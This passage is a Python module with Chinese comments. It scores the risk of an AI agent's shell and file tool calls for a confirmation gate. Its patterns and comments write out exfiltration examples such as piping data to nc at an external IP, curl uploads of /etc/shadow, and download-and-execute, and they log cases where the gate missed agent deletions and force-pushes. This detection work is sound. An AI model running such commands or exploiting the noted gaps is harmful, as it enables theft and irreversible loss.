"""针对**真实工具**的风险规则（Bash / PowerShell / Edit / Write）。

════════ 为什么必须另起一套，不能复用 fixture 的规则表 ════════

fixture（`policy.py`）里的工具长这样：

    restart_service(environment: Literal["staging","production"])

参数是**强枚举**，取值组合有限 ⇒ 可以穷举查表，规则 100% 可靠。

真实工具长这样（从本机 memory.db 的 8834 条真实调用里抽的）：

    Bash        {"command": "cd ... && git clone --depth 1 https://... "}
    PowerShell  {"command": "$c = Get-NetTCPConnection -LocalPort 3080 ..."}
    Edit        {"file_path": "...", "old_string": "...", "new_string": "..."}
    Write       {"file_path": "...", "content": "..."}

`command` 是**任意字符串** ⇒ 规则**无法穷举**，只能退化成模式识别。
这就是"实验室 fixture"与"真实调用"之间的根本差距，也是本次验证要量出来的东西：

  · 模式识别的覆盖率有多高？
  · 误报率有多高？（命令里出现 `rm` 不等于危险，可能只是 `grep "rm"` 或 `echo "rm -rf"`）

**本模块的设计立场是"宁误报勿漏报"** —— 因为门控里误报的代价是多看一眼，
漏报的代价是不可逆。所以模式写得宽，然后**把误报样本导出人工核对**，
而不是靠猜去调紧。误报率是这套方法必须付出的成本，要如实报出来。
"""

import os
import re
from typing import Dict, List, Optional, Tuple

# ══════════════════════════════════════════════════════════════════════
#  Bash / PowerShell：按命令文本的模式判定
# ══════════════════════════════════════════════════════════════════════

# 高危：不可逆、或影响面超出当前项目
_HIGH_PATTERNS: List[Tuple[str, str]] = [
    (r"\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*", "递归删除（rm -r/-rf）"),
    (r"\brm\s+-[a-zA-Z]*f", "强制删除（rm -f）"),
    (r"git\s+reset\s+--hard", "丢弃全部未提交改动"),
    # ⚠️ 2026-09-29 补真漏放：原来写成 `git\s+push` ⇒ 要求 `git` 与 `push` **紧邻**。
    #    真实日志（已发生，强推 memorix 到 GitHub 公共仓库）：
    #      cd /d/memorix-src && git -c url."git@github.com:".insteadOf="" push --force-with-lease …
    #    ⇒ 中间插了 `-c url."…".insteadOf=""`，模式不命中，原判 **0.05 low 静默放行**。
    #    改法：允许 `git` 与 `push` 之间夹参数（限定在**同一条命令段**内，
    #    即不能跨 `|` `;` `&` 和换行），不改变其他语义。
    #    `--force-with-lease` 照样命中（`--force` 后面紧跟 `-`，是词边界）——
    #    它虽然比 `--force` 安全（远端被别人推过时会拒绝），**仍然是强推**，不能静默。
    (r"\bgit\b[^|;&\n]*?\spush\b[^|;&]*\s(--force|-f)\b", "强制推送（可能覆盖远端历史）"),
    (r"git\s+clean\s+-[a-zA-Z]*[fd]", "清理未跟踪文件"),
    (r"\bgit\s+filter-branch\b", "重写仓库历史"),
    (r"\b(del|erase)\s+/[sqf]", "Windows 强制/递归删除"),
    (r"\b(rd|rmdir)\s+/s", "递归删目录"),
    (r"\bformat\s+[a-zA-Z]:", "格式化磁盘"),
    (r"\bdiskpart\b", "分区操作"),
    (r"\bmkfs(\.\w+)?\b", "格式化文件系统"),
    (r"\bdd\s+if=", "裸设备写入"),
    (r"taskkill\b[^|;&]*(/f|/im)", "强制杀进程"),
    (r"Stop-Process\b[^|;&]*-Force", "强制杀进程"),
    (r"\b(DROP|TRUNCATE)\s+(TABLE|DATABASE)\b", "删表/删库"),
    (r"\bDELETE\s+FROM\b", "SQL 删除"),
    (r"shutil\.rmtree", "Python 递归删除目录"),
    (r"os\.remove|os\.unlink", "Python 删除文件"),
    # ⚠️ 2026-09-29 补真漏放：Node/JS 内联脚本的删除调用**一个都没覆盖**。
    #    真实日志 rid=1456（已实测）：
    #      env -u NODE_OPTIONS "$NODE" -e "const fs=require('fs');
    #        for(const p of targets){ fs.rmSync(p,{recursive:true,force:true}) }"
    #      targets = ['D:/dsh_old_1786716769587','D:/deepseek-harness/node_modules',
    #                 'D:/deepseek-harness/install_diag.log']
    #    ⇒ 原判 **0.05 low 静默放行**，三个目标被真的删掉了。
    #    与 Python 那条同口径：只认**真实日志里出现过的写法**，不补没见过的第三方词汇。
    #    写法要覆盖 `fs.rmSync(` 和 `require('fs').rmSync(` 两种（真实日志里前者，
    #    本次自测里发现后者同样常见），所以点号前面允许是 `fs.` 或任意 `.`。
    #    标签写"内联脚本"不写"Node"：实测这条也会命中 Python 的 `os.rmdir(`（同一形状），
    #    写成 Node 会给出错误理由。下面是 rimraf，那个才是 Node 独有。
    (r"(?:fs\s*\.|\.)\s*(?:rm|rmdir|unlink)(?:Sync)?\s*\(", "内联脚本删除文件（rm/rmdir/unlink）"),
    (r"\brimraf\b", "Node/JS 递归删除目录"),
    (r">\s*/dev/[sh]d[a-z]", "写入裸设备"),
    (r"\b(curl|wget|irm|Invoke-WebRequest)\b[^|;&]*\|\s*(ba|z)?sh\b", "下载即执行"),
    (r"\biex\b\s*[(]", "PowerShell 动态执行"),
    (r"\bInvoke-Expression\b", "PowerShell 动态执行"),
    # ⚠️ 2026-09-29 补真漏放：**提权启动**这条规则之前根本不存在（grep 全表确认）。
    #    实测（补之前）：`Start-Process powershell -Verb RunAs -ArgumentList "Remove-Item …"`
    #    ⇒ 0.15 **静默放行**，即"用管理员权限删东西"不需要确认。
    #    提权本身即危险（拿到的是高完整性级别的进程），与载荷内容无关 ⇒ 直接高危。
    (r"-Verb\s+RunAs\b|\brunas\b(?:\s|$)", "提权启动（RunAs/管理员）"),
    (r"\breg\s+delete\b", "删除注册表项"),
    (r"\bRemove-Item\b[^|;&]*-Recurse", "递归删除（PowerShell）"),
    (r"\bbcdedit\b", "修改启动配置"),
    (r"\bvssadmin\s+delete\b", "删除卷影副本"),
]

# 中危：有副作用，且**做错了不好恢复** —— 需要用户确认
#
# 判据只有一句话：**做错了能不能轻易恢复？**
#   git push  → 远端历史已变、别人可能已拉取 → 恢复不了 → 该问
#   mv        → 覆盖了目标就丢数据           → 恢复不了 → 该问
#   reg add   → 影响系统行为                 → 不好恢复 → 该问
_MEDIUM_PATTERNS: List[Tuple[str, str]] = [
    (r"\brm\s+", "删除文件"),
    (r"\bRemove-Item\b", "删除项目（PowerShell）"),
    # 同上：允许 `git` 与 `push` 之间夹参数（`git -c ….insteadOf="" push`）。
    (r"\bgit\b[^|;&\n]*?\spush\b", "推送到远端（远端历史已变，不可撤回）"),
    (r"\bgit\s+checkout\s+--\s", "丢弃工作区改动"),
    (r"\bgit\s+branch\s+-D\b", "强制删除分支"),
    (r"\bgit\s+tag\s+-d\b", "删除标签"),
    (r"\bgit\s+stash\s+(drop|clear)\b", "丢弃 stash"),
    (r"\bmv\s+", "移动/覆盖文件（目标内容会丢失）"),
    # ⚠️ 2026-09-28 补：计划任务的 PowerShell cmdlet 原先**一个都没进表**。
    #    `Set-ScheduledTask` 会真的改任务（实测这条把触发器禁用了：
    #    `$t.Triggers[0].Enabled = $false; $t | Set-ScheduledTask`），
    #    旧规则只是歪打正着——同一条命令里恰好还有 `Out-File` 才被判 medium。
    #    给 PowerShell 写文件改成按路径判之后，`Out-File` 降成 low，这条就**漏了**。
    #    ⇒ 变更类 cmdlet 必须自己站住，不能靠同命令里的别的动作"蹭"到中危。
    #    （只读的 `Get-ScheduledTask` 刻意不进表 —— 查一下任务不该被拦。）
    #    `Start/Stop-ScheduledTask` 是**触发/中止运行**，跟 `Start-Process` 同级，
    #    实测遗漏代价：#3734 那条 `Start-ScheduledTask -TaskName 'cc-connect'`
    #    原来靠同命令里的 `Out-File` 蹭到中危，写文件按路径判之后就掉成 low 了。
    (r"\b(Set|Register|Unregister|New|Disable|Enable|Start|Stop)-ScheduledTask\b",
     "计划任务（PowerShell 变更类）"),
    (r"\b(Set-Content|Out-File|Add-Content)\b", "写文件（PowerShell）"),
    # `Start-Process` 已于 2026-09-29 降到 `_MILD_PATTERNS`（见那里的三条理由）
    (r"\bschtasks\b", "计划任务"),
    (r"\bnet\s+user\b", "用户账户操作"),
    (r"\breg\s+add\b", "写注册表"),
    (r"\bSet-ItemProperty\b", "修改配置属性"),
    (r"\bchmod\b|\bchown\b", "改权限/属主"),
    (r"\bsudo\b", "提权执行"),
    (r">\s*[A-Za-z]:[\\/]", "重定向写入指定路径"),
    (r"\bsetx\b", "持久化环境变量"),
]

# 温和副作用：有动作，但**做错了能轻松恢复**，且是 agent 的高频常规操作
# —— 分数低于 0.35，落 low 档，不打扰用户。
#
# ⚠️ 这一档是真实日志逼出来的。第一版把 `git commit` 和 `pip install` 都放在
# 中危档，跑出来发现它们分别是 23 条和 108 条打扰，合计占了打扰总量的 8%。
# 而这两个操作用户每十分钟就会让 agent 做一次 —— 每次都问，门控必然被关掉。
#
# 关键区分：
#   git commit  → reset --soft HEAD~1 就能撤销 → 可恢复
#   pip install → pip uninstall 就能撤销      → 可恢复
#   git push    → 远端历史已改，撤不回        → 不可恢复（留在中危档）
_MILD_PATTERNS: List[Tuple[str, str]] = [
    (r"\bgit\s+commit\b", "提交改动（可用 reset --soft 撤销）"),
    (r"\bgit\s+add\b", "暂存改动"),
    (r"\bgit\s+stash\b", "暂存工作区"),
    (r"\bgit\s+merge\b", "合并分支（可 reset 撤销）"),
    (r"\bgit\s+rebase\b", "变基（可由 reflog 恢复）"),
    (r"\bgit\s+init\b", "初始化仓库"),
    (r"\bgit\s+clone\b", "克隆仓库（不改动现有内容）"),
    (r"\b(pip|pip3)\s+(install|uninstall)", "改动 Python 环境（可卸载恢复）"),
    (r"\b(npm|pnpm|yarn)\s+(install|add|remove|uninstall|link)", "改动 Node 环境（可重装恢复）"),
    (r"\bconda\s+(install|remove|create|env\s+remove)", "改动 conda 环境（可重建）"),
    (r"\bmkdir\b", "创建目录"),
    (r"\btouch\b", "创建空文件"),
    (r"\bcp\s+", "复制文件"),
    (r"\bNew-Item\b", "创建文件/目录（PowerShell，新增而非覆盖）"),
    # ⚠️ 2026-09-29 降档：原来是 medium 0.50，把本机每天要跑的 cc-connect 重启脚本全拦了。
    #    为什么 0.25 够（三条理由，按说服力排序）：
    #      ① **可逆性**：起一个进程不丢任何数据，随手就能关掉；
    #         而它的对偶动作 `Stop-Process`（可能丢未保存的工作）我们都只判 0.30。
    #         ⇒ 启动不该比杀进程更严，这是同一张表里的**内部不一致**。
    #      ② **危险不在动词，在载荷**：`Start-Process powershell -ArgumentList "<删库>"`
    #         的危险来自载荷。本次已让 `-ArgumentList` 载荷照扫（见 `_EXECUTES_CODE`），
    #         载荷危险时照样 0.90 —— 降的是动词，不是内容。
    #      ③ **提权单独站住**：`-Verb RunAs` 已进 HIGH（0.90），不跟着一起降。
    #    三条都到位了才降；少任何一条都不能降（否则 `Start-Process -Verb RunAs` 会静默提权）。
    (r"\bStart-Process\b", "启动进程（可随时关闭，不改动任何数据）"),
]


# ══════════════════════════════════════════════════════════════════════
#  ⭐ 第三维度：跨领域硬化规则（2026-09-23 并入）
# ══════════════════════════════════════════════════════════════════════
# 来源：§7.10 用第三方 60 题基准暴露出的**真实盲区** —— 「信息外传」整个维度没有建模。
#   `curl -X POST … -d @/etc/shadow`、`tar czf - … | nc <外部IP>`、`scp -r ~/.aws user@host:`
#   全部原判 `low` **静默放行**。这不是领域差异（本地 Windows 场景同样存在：
#   把 `~/.ssh/id_rsa` 或 `os.environ` 打包送出去），所以必须补。
#
# ⚠️ 并入范围**严格限定在"跨领域也成立"的语义**：
#   纯云领域词汇（`kubectl delete` / `helm uninstall` / `aws iam …` / `aws s3 …` /
#   `gcloud …` / SQL 提权）**一律不补** —— 补它们等于把那份考卷背下来。
#
# ⚠️ 第一版判据在真实语料上「2 条命中、2 条全是误伤」，教训写在下面各处。
#   该版本曾在提案阶段验证：自家 4,241 条语料误伤 **2 → 0**，外传拦截 **0/10 → 4/10**。

# （本地/私有地址的判断见下方 `_is_local_host()` —— 用函数而非单条正则，
#   因为裸 IP 与 URL 形式需要分别取主机名再判断。）
_HOST_IN_CMD = re.compile(
    r"https?://([\w.\-]+)(?::\d+)?"                              # URL 形式
    r"|[\w.\-]+@([\w.\-]+):"                                     # scp 形式 user@host:
    r"|(?:^|[\s|(])((?:\d{1,3}\.){3}\d{1,3})(?::\d+)?(?=[\s|;&)]|$)",  # 裸 IP（nc/socat 用）
    re.IGNORECASE,
)

# ── 外传的"动作"侧 ──
# 管道给网络工具（打包外传 / 反弹连接）
_PIPE_TO_NET = re.compile(r"\|\s*(nc|ncat|netcat|socat)\b", re.IGNORECASE)
# 从**文件或标准输入**读数据上传（`-d @file` / `--data-binary @-`）
_UPLOAD_FROM_FILE = re.compile(
    r"\b(curl|wget)\b[^|;&]*?"
    r"(--data-binary|--data-raw|--data-urlencode|--post-file|--upload-file)\s*@"
    r"|\b(curl|wget)\b[^|;&]*?(?:^|\s)(-d|--data|-T)\s*@",
    re.IGNORECASE,
)
# scp / rsync 到远端主机
_REMOTE_COPY = re.compile(r"\b(scp|rsync)\b[^|;&]*\s[\w.\-]+@[\w.\-]+:", re.IGNORECASE)
# 代码里直接发起 POST / 建连
_CODE_POST = re.compile(
    r"requests\.(post|put)\(|urllib\.request\.(urlopen|Request)|"
    r"http\.client\.HTTP|socket\.socket\(|COPY\s+\w+\s+TO\s+PROGRAM",
    re.IGNORECASE,
)
# ── 外传的"内容"侧：敏感源 ──
_SENSITIVE_SRC = re.compile(
    r"/etc/(shadow|passwd|sudoers)"
    r"|\.ssh/|\.aws/|\.aws\b|id_rsa|\.pem\b|\.env\b"
    r"|os\.environ|process\.env|getenv\("
    r"|\.git-credentials|\.netrc|token|secret|credential",
    re.IGNORECASE,
)

# 管道转发到外部：上游输出直接送给 curl/wget 的上传形态
#   ⚠️ 这条是边界用例补出来的：`curl -s localhost:9090/x | curl -X POST https://ext/ -d @-`
#   属于"把一条命令的输出转发到外部"，与"内容是否敏感"无关 ⇒ 单独作为动作侧判据。
_PIPE_TO_UPLOAD = re.compile(
    r"\|\s*(curl|wget)\b[^|;&]*?"
    r"(--upload-file|--data-binary|--data-raw|--post-file|--data\b|(?:^|\s)-d\s|(?:^|\s)-T\s)",
    re.IGNORECASE,
)

# ── 显式关闭安全校验 ──
# ⚠️ 拆成两组，因为它们的**危险程度与判据不同**（边界用例换来的）：
#   · 持久化/环境级：改的是全局配置或进程环境 ⇒ 本身就危险，**不需要外部目标**
#     例：`npm config set strict-ssl false`、`NODE_TLS_REJECT_UNAUTHORIZED=0`
#   · 单次 flag：只影响这一次 ⇒ **需要外部目标**才判
#     例：`git commit --no-verify`（本地提交跳过 hook，正常用法，不该打扰）
#         `git clone --insecure <外部仓库>`（该打扰）
# ⚠️ 刻意**不收录** `sslVerify=false` / `verify=false` 这类写法：
#   它们在代理环境里是常规操作（实测误伤了 `git -c http.sslVerify=false clone <镜像>`），
#   单独作为判据噪声太大。
_DISABLE_SECURITY_PERSISTENT = re.compile(
    r"config\s+set[^|;&]*strict-ssl\s+false"
    r"|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*[\"']?0"
    r"|GIT_SSL_NO_VERIFY\s*=\s*1"
    r"|rejectUnauthorized\s*[:=]\s*false"
    r"|\b(auth\.(enabled|required)|tls\.verify)\s*[:=]\s*[\"']?false",
    re.IGNORECASE,
)
_DISABLE_SECURITY_ONESHOT = re.compile(
    r"--insecure\b|--no-verify\b|--skip-verify\b", re.IGNORECASE,
)

# ── 写入本机提权位置 ──
_PRIV_WRITE = re.compile(
    r"chmod\s+(-R\s+)?[0-7]*7{2,3}\b"
    r"|>>?\s*[^\s|;&]*\.ssh[/\\]authorized_keys"
    r"|/etc/sudoers"
    r"|(>>?|tee)\s*[^\s|;&]*\.ssh[/\\]",
    re.IGNORECASE,
)

# ── 明确"在数据库里执行 shell" ──
#   `COPY users TO PROGRAM 'curl …'`：PostgreSQL 的 `TO/FROM PROGRAM` 会真的起一个 shell 进程。
#   ⚠️ 它同时也是"引号里装的是被执行的代码"⇒ 必须加进 `_EXECUTES_CODE`，
#      否则 `_strip_quoted` 会把引号连同里面的外部地址一起剥掉 ⇒ 漏判。
#   （跨领域成立：任何本机 PostgreSQL 都有这个能力，不是云特有。）
_COPY_TO_PROGRAM = re.compile(r"COPY\s+\S+\s+(TO|FROM)\s+PROGRAM\b", re.IGNORECASE)

# ── "引号里装的是会被执行的代码" ──
#   ⚠️ 这个判断被**两处**用到（基础判定 + 硬化检查），必须共用同一份定义，
#      否则两处的"要不要剥引号"会不一致 —— 那正是口径漂移的老毛病（§7.23）。
#   历史教训：不加这个判断，`python -c "import os; os.remove('x')"` 会被当成
#   "引用语境"直接放行 ⇒ 真漏放。新增 `COPY … TO PROGRAM` 同理（引号里是要执行的 shell）。
_EXECUTES_CODE = re.compile(
    r"(\s-c\s|\s-e\s|--command\b|\beval\b|\biex\b|Invoke-Expression|(bash|sh|zsh)\s+-c)"
    # ⚠️ 2026-09-29 补：`Start-Process … -ArgumentList "<payload>"` 里的载荷**真的会执行**，
    #    原来没进这张表 ⇒ 被 `_strip_quoted` 当成搜索串抹掉。
    #    实测（补之前）：`Start-Process powershell -ArgumentList "Remove-Item -Recurse D:/data"`
    #    ⇒ 载荷完全不可见，只能靠"启动进程"这个动词兜底。
    r"|-ArgumentList\b"
    r"|COPY\s+\S+\s+(TO|FROM)\s+PROGRAM\b",
    re.IGNORECASE,
)


def _is_local_host(host: str) -> bool:
    """回环 / 私有网段 / 内网域名 ⇒ 是"内部通信"，不算外传。"""
    h = (host or "").lower().strip("[]")
    if h in ("localhost", "0.0.0.0", "::1"):
        return True
    if h.startswith(("127.", "10.", "192.168.")):
        return True
    if re.match(r"^172\.(1[6-9]|2\d|3[01])\.", h):
        return True
    return ".local" in h or ".internal" in h


def _has_external_target(text: str) -> bool:
    """命令里**至少有一个**非本地/非私有主机，才算"外传"。

    ⚠️ 这一维是踩坑换来的：第一版只看"有没有把敏感数据发出去"，
    结果把 `python -c "… http://127.0.0.1:3081/?token=…"`（本地回环调试）
    判成了外传。⇒ 少了这一维，误伤会来得非常快。
    ⚠️ 第二处补漏：`| nc 203.0.113.9 4444` 用的是**裸 IP + 端口**，不是 URL，
    原来的 `_HOST_IN_CMD` 漏了它 ⇒ 反弹连接被静默放行。
    """
    for m in _HOST_IN_CMD.finditer(text):
        host = m.group(1) or m.group(2) or m.group(3) or ""
        if host and not _is_local_host(host):
            return True
    return False


def _hardening_risk(text: str) -> Optional[Tuple[float, str]]:
    """跨领域硬化检查：外传 / 关闭安全校验 / 写入提权位置。返回 (分数, 理由) 或 None。

    `text` 传入的是**已经被调用方按执行语义处理过的文本**（见包装函数）：
    引号里装的是被执行的代码时传原文，否则传去掉引号的骨架
    —— 这样 `grep "curl -d @/etc/shadow" notes.txt` 这种搜索语境不会被打扰。
    """
    hits: List[str] = []
    external = _has_external_target(text)
    uploadish = bool(_PIPE_TO_NET.search(text) or _UPLOAD_FROM_FILE.search(text)
                     or _REMOTE_COPY.search(text) or _CODE_POST.search(text))
    # ① 外传 = 有上传动作 AND 内容是敏感源 AND 目标是外部 —— 缺一不可
    if uploadish and _SENSITIVE_SRC.search(text) and external:
        hits.append("信息外传（把敏感内容送往外部）")
    # ② 管道转发到外部（与内容是否敏感无关）
    elif external and (_REMOTE_COPY.search(text) or _PIPE_TO_NET.search(text)
                       or _PIPE_TO_UPLOAD.search(text)):
        hits.append("管道至网络工具 / 复制到远端主机")
    # ③ 持久化关闭安全校验 —— 本身即危险，不要求外部目标
    if _DISABLE_SECURITY_PERSISTENT.search(text):
        hits.append("持久化关闭安全校验")
    # ④ 单次关闭安全校验 —— 需结合外部目标（否则 `git commit --no-verify` 会被误伤）
    elif _DISABLE_SECURITY_ONESHOT.search(text) and external:
        hits.append("对远端目标关闭安全校验")
    # ⑤ 写入本机提权位置（纯本地动作）
    if _PRIV_WRITE.search(text):
        hits.append("写入本机提权位置")
    # ⑥ 在数据库里执行 shell —— 动作本身即危险，不要求敏感源或外部目标
    if _COPY_TO_PROGRAM.search(text):
        hits.append("在数据库中执行 shell（COPY … TO PROGRAM）")
    if hits:
        return 0.50, "中危：跨领域硬化规则 —— " + "；".join(hits)
    return None


# ⚠️ 2026-09-28 补真漏放：**通过 API / CLI 删除远端资源**。
#
#    真实日志证据：`gh api -X DELETE "/repos/wjxn13/-"`（删 GitHub 仓库）
#    原判 **0.05 low 静默放行**。这类操作不可逆 —— 远端资源丢失，
#    而且它根本不在本机文件系统的"可再生/草稿"语义里，第二维度救不了。
#
# ⚠️⚠️ 并入范围**严格限定**（遵守本文件 130-132 行那条既有决策）：
#      ✅ `gh` / `glab`（GitHub / GitLab CLI）—— 我们自己的真实工具，
#         日志里天天出现，不是第三方考卷里的词汇。
#      ✅ `curl` / `wget` / `Invoke-RestMethod` 发 DELETE，且目标是**外部**
#         （复用 `_has_external_target` ⇒ `curl -X DELETE http://127.0.0.1:3080/...`
#          本地调试自动排除，这一维是踩过坑的，不能省）。
#      ❌ `kubectl delete` / `helm uninstall` / `aws iam …` / SQL 提权 ——
#         纯云领域词汇，一律不补。补它们等于把那份 60 题基准背下来。
_API_DELETE = re.compile(
    r"\b(?:gh|glab)\s+(?:"
    r"repo\s+delete\b"                                   # gh repo delete <repo>
    r"|api\s+[^|;&\n]*?(?:-X|--method)\s+DELETE\b"       # gh api -X DELETE / --method DELETE
    r"|(?:secret|variable|release|pr)\s+delete\b"        # gh secret delete …
    r")", re.IGNORECASE)

# HTTP DELETE 到外部目标（本地回环由调用方用 `_has_external_target` 排除）
_HTTP_DELETE = re.compile(
    r"\b(?:curl|wget|Invoke-RestMethod|Invoke-WebRequest)\b[^|;&\n]*?"
    r"(?:-X|--request)\s+DELETE\b", re.IGNORECASE)


# ══════════════════════════════════════════════════════════════════════
#  ⭐ 第二维度：影响范围
# ══════════════════════════════════════════════════════════════════════
# 这是**真实日志逼出来的修正**。第一版只按"动作类型"判风险，跑 8618 条
# 真实调用得出的打扰率是 19.31%，其中 high 档 271 条里绝大部分是误判：
#
#     rm -f ".../modlens_test.png"            ← 删一张测试图
#     rm -rf node_modules package.json        ← 删依赖，可重装
#     Stop-Process -Force -Id <自己起的服务>   ← 杀自己的 server，可重启
#
# 这些动作"看起来"危险，但**都是可逆的**。而 fixture 里的风险公式是
# `动作 × 环境 × 范围` 三维 —— 我把前两维照搬过来了，却漏了第三维。
#
# 关键的判据不是"动作后缀是什么"，而是**"坏了能不能恢复"**：
#   删依赖/缓存/临时文件/构建产物 → 可重建 → 降级
#   删源码/整个项目/带通配符的范围 → 不可预知 → 保持高危

# 可再生目标：删掉它们通常能重建（重装依赖、重新构建、重新生成）
#
# ⚠️ 2026-09-21 改：从「枚举前缀」改成「识别约定」
#
#   起因：拿本机 103 次**真实发生过**的删除做审计，发现 26 次误报里
#   有 13 次的文件名形如 `_tree.txt` / `_check.txt` / `_err1.txt` / `_assess.py`。
#   原词表只列了 `_tmp_` / `_probe_` / `_sess` / `_dump` 四个前缀 ——
#   全是**我这个作者自己用过的名字**，于是漏掉了 agent 最通用那条约定：
#   **下划线开头 = 草稿/中间产物**。
#
#   ⇒ 教训：白名单的致命弱点不是"漏了某项"，而是**它只能覆盖写它的人见过的东西**。
#     凡是存在通用约定的地方，就该识别约定，不该逐条枚举。
#
#   安全性：命中后只降到 0.50（medium，**仍然要求用户确认**），
#   绝不会降成 low 直接放行 —— 所以放宽不会带来漏报风险。
_REGENERABLE = re.compile(
    r"(node_modules|__pycache__|\.pytest_cache|\.mypy_cache|npm-cache|"
    r"\.pnpm-store|pnpm-cache|\.cache[/\\]|_tmp_|_probe_|_sess|_dump|"
    r"[/\\]temp[/\\]|[/\\]tmp[/\\]|\.log\b|\.tmp\b|\.bak\b|"
    r"\.png\b|\.jpg\b|\.jpeg\b|\.webp\b|test.*\.py\b|"
    # ↓ 2026-09-28 补丁 D2 新增（三条都来自 4241 条影子审计里的真误报）
    r"_?probe[/\\]|"                 # `_chrome_probe/profile` 这类探测目录（测试产物）
    r"(^|[/\\])tmp[_.\-]|"           # `tmp_remote_memorix.db` 等 tmp 前缀临时文件
    r"[_.\-\\/]check([_.\-\\/].*)?\.py\b|"   # `banner_check.py` 之类临时检查脚本
    #   ↑ 前半段强制 `check` 前后有分隔符，避免误伤 `checklist.py` 这类正常源码。
    #     ⚠️ 中间那段必须写成"可选"：第一版写成 `[_.\-]check[_.\-].*\.py`，
    #     把 `.py` 里的点当分隔符吃掉了，后面再也凑不出 `\.py` ⇒ 整条失效（`banner_check.py` 实测不命中）。
    # ↓ 2026-09-21 新增：下划线开头的文件名（agent 通用草稿约定）
    #
    # ⚠️ 注意 `(^|[/\\])` 这个前缀 —— 第一版只写了 `[/\\]_`，
    #   于是在 `cd X && rm -f _tree.txt _probe3.txt` 这类**相对文件名**上失效：
    #   裸文件名前面没有分隔符，匹配不到。
    #   而"先 cd 再删相对名"恰恰是 agent 最常用的删除写法（实测本机 103 次里占相当比例）。
    r"(^|[/\\])_[^/\\]*$)",
    re.IGNORECASE,
)

# ══════════════════════════════════════════════════════════════════════
#  ⭐ 2026-09-23 新增：「可再生草稿」进一步降到 low（静默放行）
# ══════════════════════════════════════════════════════════════════════
#
# 为什么需要它：
#   §3.3 已用实测证明 —— **修规则 bug 降不了打扰率**（7 条降档，总打扰数一条没少），
#   因为修完分数从 0.90 挪到 0.50，两者**都在"要问"区间**。
#   ⇒ 要真降打扰，必须让草稿清理落到 `low`（静默放行）。这是**策略选择**，
#     拿"漏删一个文件"的风险换"少问一批"。
#
# 反事实实测（103 条真实删除审计）：
#   打扰率 68.9% → **46.6%**（降 23 条）
#
# ⚠️ 为什么是 46.6% 而不是 43.7%：
#   全量降档能到 43.7%（降 26 条），但归因发现其中 3 条是
#   `.workbuddy/memory/*.md` —— **记忆文件，不可再生**。
#   所以这里额外加一条"耐久目录"排除，主动放弃那 3 条降幅（损失 2.9 个点），
#   换取"永不静默删除记忆/桌面/文档/下载里的文件"。
#
# ⚠️ 纵深防御：`_DURABLE_DIRS` 是**否决项**，优先级高于任何"可再生"判定。
#   即使以后有人放宽 `_REGENERABLE`，这几个目录也降不下去。
_DURABLE_DIRS = re.compile(
    r"\.workbuddy[/\\]memory"          # 记忆文件（append-only，不可再生）
    r"|[/\\]desktop[/\\]"              # 用户桌面
    r"|[/\\]documents[/\\]"            # 用户文档
    r"|[/\\]downloads[/\\]",           # 用户下载
    re.IGNORECASE,
)

# 严格草稿：**必须同时**满足「已知草稿词开头」+「临时扩展名」才允许静默放行。
#
# ⚠️ 踩坑记录（2026-09-23，被实测挡下）：第一版写的是「basename 以下划线开头」，
#   即 `(^|[/\\])_{1,3}[^/\\]*$`。这个判据**会误伤用户文件** —— 下划线前缀只是
#   一种命名习惯，用户完全可能用。实测：
#       rm -f "_2026预算.xlsx"            → 被判 0.20（静默放行）❌
#       rm -f "D:/工作/_年度报告.docx"     → 被判 0.20（静默放行）❌
#       rm -f _tree.txt "D:/工作/_重要.docx" → 混合场景也被 0.20 ❌
#   最后一条最危险：用户文件**自己**也满足「下划线开头」，所以 `all()` 照样通过，
#   多目标下的混合删除完全失去保护。
#   ⇒ 结论：「看起来像草稿」不能靠通配前缀，只能靠**明确词表**。
#
# 现在是「词表前缀 + 临时扩展名」两个弱信号叠加：
#   · 词表决定它**像不像调试产物**（不是任意下划线文件）
#   · 扩展名决定它**像不像可再生的数据文件**（不是目录、不是用户文档格式）
#   ⚠️ 刻意**不收录** `node_modules` / `.cache` / `test*.py` —— 它们虽可重建，
#     但删除它们通常是用户主动要求的大动作，静默放行不合适。
_SCRATCH_WORDS = (
    "sess|dump|probe|tree|procs?|proc|orphan|kill|agents?|chk|check|assess|"
    "tone_test|sim_tone|cdp_check|node_procs"
)
_STRICT_SCRATCH = re.compile(
    r"(^|[/\\])_?(" + _SCRATCH_WORDS + r")[0-9a-z_\-]*"
    r"\.(txt|log|tmp|json|csv|png|jpe?g|webp|wav|mp3|py|js|mjs|ts|bat|ps1|html?)$",
    re.IGNORECASE,
)

# 范围不可知或明确很大：通配符、盘根、项目根、.git
#
# ⚠️ 锚定很重要：这些模式必须匹配到**目标路径本身**，而不是路径中间的某一段。
# 踩坑实例：`rm -f ".../<工作区>/2026-08-15-20-39-15/_probe_out.png"`
# 只是删会话目录里的**一个文件**，但最初没加结尾锚定时，
# 路径中间的会话目录名命中了"删整个项目"模式 → 被误判成 0.95 高危。
_BROAD_SCOPE = re.compile(
    # 通配符必须**紧跟路径分隔符**才算"范围不可知"（如 `/d/*`、`/d/*/`）。
    # ⚠️ 星号在**文件名内部**时范围其实是确定的（`_sess_*.txt` 只匹配那一类文件），
    # 不该按"范围不可知"处理 —— 实测踩过：`rm -f /d/dsh/_sess_*.txt`
    # 只是清理临时转储，却因为裸匹配 `\*` 被升到 high。
    r"([/\\]\*|\*[/\\]"
    r"|\.git/?$"                        # 删 .git 目录
    r"|^/[a-z]/?$|^[a-z]:[\\/]?$"       # 盘根
    r"|^/[a-z]/$|^[a-z]:\\$"
    r"|/workbuddy/\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}/?$"   # 整个会话目录
    r")",
    re.IGNORECASE,
)

# 提取 rm 的目标路径（跳过 -rf / -f 这类开关）
_RM_TARGETS = re.compile(r"\brm\s+((?:-[a-zA-Z]+\s+)*)([^;&|\n]+)")


def _rm_targets(command: str) -> List[str]:
    """粗略提取 rm 命令的目标路径列表。

    ⚠️ 必须滤掉 shell 重定向记号。踩坑实例：
        `rm -f /d/dsh/_sess_dump.txt ... /d/dsh/_sess2_*.txt 2>/dev/null`
      其中 `2>/dev/null` 被当成一个"删除目标"，而它当然不在可再生词表里
      ⇒ `all(...)` 不成立 ⇒ 整条命令判 0.90 高危。
      **一个重定向符号把一批纯草稿文件的判定全部带偏。**
    """
    out: List[str] = []
    for m in _RM_TARGETS.finditer(command):
        rest = m.group(2)
        for tok in rest.split():
            tok = tok.strip().strip("\"'").strip()
            if not tok or tok.startswith("-"):
                continue
            if ">" in tok or "<" in tok or tok.startswith("&"):
